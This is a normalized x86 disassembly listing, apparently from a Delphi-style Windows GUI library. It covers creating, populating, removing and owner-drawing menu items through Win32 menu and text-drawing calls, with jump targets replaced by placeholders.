mov ebx [ edi + 0x60 ]
test ebx ebx
je r-xdata
mov eax [ edi + 0x30 ]
mov edx r-xdata
call j_sub_44a294
sete al
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
movzx eax [ edi + 0x44 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x34 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ edi + 0x35 ]
or eax [ edx * 4 + rw-data ]
or ebx eax
or ebx 0x400
mov eax edi
call sub_466084
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x44 ]
movzx eax [ edi + 0x5c ]
call sub_462374
push [ ebp - 0x44 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_44a1b8
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
movzx eax [ edi + 0x4c ]
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuW
mov eax [ edi + 0x30 ]
call sub_449db8
push eax
mov eax edi
call sub_46342c
push eax
or ebx 0x10
push ebx
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuW
jmp r-xdata
mov [ ebp - 0x40 ] 0x30
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jle r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov [ ebp - 0x3c ] 0x3f
mov eax edi
call sub_466650
mov esi eax
mov eax edi
call sub_4657fc
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
mov [ ebp - 0x40 ] 0x2c
mov ebx [ edi + 0x48 ]
test ebx ebx
je r-xdata
cmp [ esi + 0x3c ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
mov al 0x1
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ebx eax
mov eax [ edi + 0x60 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ edi + 0x30 ]
mov edx r-xdata
call j_sub_44a294
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x39 ]
mov edx [ edx * 4 + rw-data ]
movzx ecx [ edi + 0x44 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
movzx edx [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
movzx edx bl
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x38 ] eax
movzx eax [ edi + 0x34 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ edi + 0x35 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ edi + 0x36 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x34 ] eax
movzx eax [ edi + 0x4c ]
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax edi
call sub_466084
test eax eax
jle r-xdata
xor edx edx
mov eax 0x6
call sub_43a7f0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_449db8
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x40 ]
push eax
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call InsertMenuItemW
jmp r-xdata
mov eax edi
call sub_46342c
mov [ ebp - 0x2c ] eax
call sub_44c2c8
cmp [ eax + 0x5 ] 0x0
je r-xdata
test bl bl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
cmp [ edi + 0x48 ] 0x0
jne r-xdata
cmp [ edi + 0x3c ] 0xffffffff
jne r-xdata
mov al 0x1
cmp [ esi + 0x3c ] 0x0
jne r-xdata
sub_46318f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx ecx [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xac ]
call sub_462ea0
xor eax eax
pop ebp
retn
sub_4631b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_46807c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_466cd0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46725c
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x64 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4628b0
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_463228
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_463272
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_42a58c
mov eax [ ebp - 0x4 ]
call sub_4626a0
mov edx eax
mov eax ebx
call sub_4660b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463279
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_463280
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x64 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x64 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x68 ] ecx
mov eax ebx
call sub_4632f8
mov [ eax + 0x68 ] ebx
mov edx ebx
call sub_42e354
sub_4632bc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_42e6f8
mov eax ebx
call sub_46606c
test eax eax
je r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax ebx
call sub_46606c
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4483f8
pop esi
pop ebx
retn
mov eax ebx
call sub_4632f8
sub_4632f8
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x68 ]
test eax eax
je r-xdata
mov [ ebp + 0x70 ] 0x1
jmp r-xdata
mov eax ebp
call sub_46342c
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_4632f8
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_46342c
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x60 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_46342c
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_4631b8
mov eax [ ebp + 0x6c ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebp
call sub_46342c
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0xac ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0xac ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4633cc
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_466084
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_466094
cmp bl [ eax + 0x3b ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_466094
cmp bl [ eax + 0x3b ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_466094
mov [ eax + 0x3b ] bl
mov eax [ rw-data ]
call sub_4622cc
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_46342c
push ebx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov eax [ ebx + 0xac ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0xac ] eax
call CreatePopupMenu
mov [ ebx + 0xac ] eax
jmp r-xdata
mov eax ebx
call sub_4631b8
mov eax [ rw-data ]
call sub_4622cc
cmp [ ebx + 0xac ] 0x0
jne r-xdata
sub_463484
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42e610
push ebx
push sub_463228
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_4634d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_463749
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_466650
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_449d80
test bh 0x4
je r-xdata
mov eax edi
call sub_46807c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call j_sub_44a294
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_46e058
cmp [ esi + 0x36 ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x35 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_46d95c
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_46d968
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463750
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x8 ]
call sub_46e8c8
push eax
call DrawEdge
jmp r-xdata
cmp [ eax ] 0x26
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
mov eax [ ebp - 0x8 ]
call sub_46e8c8
mov esi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44a068
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx 0x1
mov edx 0x1
call sub_432b28
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_46d5ac
mov eax [ ebp - 0x8 ]
call sub_46e8c8
mov esi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0x2 ] 0x0
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push edi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push esi
call DrawTextW
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_46d5ac
mov eax 0xff00000d
call sub_46cf24
mov esi eax
mov eax 0xff000010
call sub_46cf24
cmp esi eax
jne r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_46d5ac
jmp r-xdata
push ebx
mov eax [ ebp + 0x10 ]
push eax
push edi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push esi
call DrawTextW
mov eax [ ebp + 0x10 ]
or ecx 0xffffffff
or edx 0xffffffff
call sub_432b28
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_4637c0
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_463993
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x40
call sub_447ae4
mov [ ebp - 0x54 ] 0x40
mov [ ebp - 0x50 ] 0x2001
mov eax ebx
and eax 0x400
cmp eax 0x400
jne r-xdata
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_46cf24
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x8 ]
call sub_466650
mov edi eax
test edi edi
je r-xdata
or [ ebp - 0x50 ] 0x200
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_449d80
test bh 0x4
je r-xdata
mov eax edi
call sub_46807c
test al al
je r-xdata
mov eax [ esi + 0x14 ]
mov dl 0x1
call sub_46e058
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x36 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
test bl 0x0
jne r-xdata
call sub_44c2c8
mov dl 0x7
call sub_44c394
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_46e8c8
mov esi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edi [ esi + 0xc ]
mov eax edi
call sub_46d95c
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_46d968
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp [ eax ] 0x26
jne r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test al al
je r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x35 ]
mov eax [ eax * 4 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push edi
push ebx
mov eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
mov ecx 0xe
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_41d610
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46399a
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44a068
cmp [ eax + 0x2 ] 0x0
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_4639b8
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xffffffd8
mov edi [ ebp + 0x8 ]
add edi 0xfffffff0
xor eax eax
push ebp
push sub_46431c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x0
push edi
push 0x0
push 0x9
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x8 ]
push eax
push 0xedb
mov eax [ esi ]
movzx eax [ eax + 0x35 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0xe
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_46d5ac
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ ebp - 0x18 ]
sub eax [ ebp - 0x34 ]
sub eax [ ebp - 0x34 ]
call sub_432a2c
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x2c ]
add eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
mov ecx [ edi ]
add ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x34 ]
mov edx [ edi + 0x4 ]
mov eax [ edi ]
call sub_432a2c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_46df1c
lea eax [ ebp - 0x8 ]
push eax
push 0xedb
mov eax [ esi ]
movzx eax [ eax + 0x35 ]
mov eax [ eax * 4 + rw-data ]
push eax
push 0x8
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_46d5ac
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax - 0x20 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov eax [ eax + 0x30 ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edi [ eax - 0x20 ]
lea esi [ ebp - 0x58 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e300
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_46df1c
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov eax [ eax + 0x34 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov edx [ ebp + 0x8 ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push 0x0
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov edx [ esi ]
movzx edx [ edx + 0x35 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x38 ]
push eax
push 0x0
push 0xe12
mov eax [ esi ]
movzx eax [ eax + 0x39 ]
mov edx [ esi ]
movzx edx [ edx + 0x35 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x34 ]
sub [ ebp - 0x48 ] eax
mov eax [ ebp - 0x24 ]
sub [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x38 ]
add [ ebp - 0x40 ] eax
mov eax [ ebp - 0x28 ]
add [ ebp - 0x40 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x14 ]
sub ecx [ ebp - 0x4c ]
sar ecx 0x1
jns r-xdata
mov edx ebx
xor dl 0x1
test dl dl
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x48 ]
push eax
push 0x0
push 0xd
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
sub edx [ ebp - 0x50 ]
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov edx [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
sub [ edx - 0x20 ] eax
mov edx [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x18 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x58 ]
call sub_432b28
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x0
push 0xe11
push 0x1
push 0xe
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp [ eax + 0x3c ] 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
mov eax ebx
xor al 0x1
test al al
je r-xdata
push 0x0
push edi
push 0x2
push 0xe
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x32 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_44f6d8
mov edx [ esi ]
cmp eax [ edx + 0x3c ]
jg r-xdata
mov eax [ esi ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x3c ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x28 ]
sub [ edi + 0x8 ] eax
mov eax [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp - 0x28 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov al 0x1
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x10
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_46e8c8
push eax
call sub_44c2c8
mov dl 0x7
call sub_44c394
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax ebx
xor al 0x1
test al al
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
je r-xdata
push 0x10
lea eax [ ebp - 0x68 ]
push eax
mov ecx 0x10
xor edx edx
xor eax eax
call sub_432a2c
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub edx 0x10
sar edx 0x1
jns r-xdata
mov eax [ esi ]
cmp [ eax + 0x3c ] 0xffffffff
jle r-xdata
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp - 0x28 ]
sub [ edi + 0x8 ] eax
mov eax [ ebp - 0x28 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x20 ]
sub [ edi + 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x20 ]
add [ edi ] eax
jmp r-xdata
test bl bl
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp - 0x10 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub [ edi + 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edx [ ecx - 0x1c ]
push edx
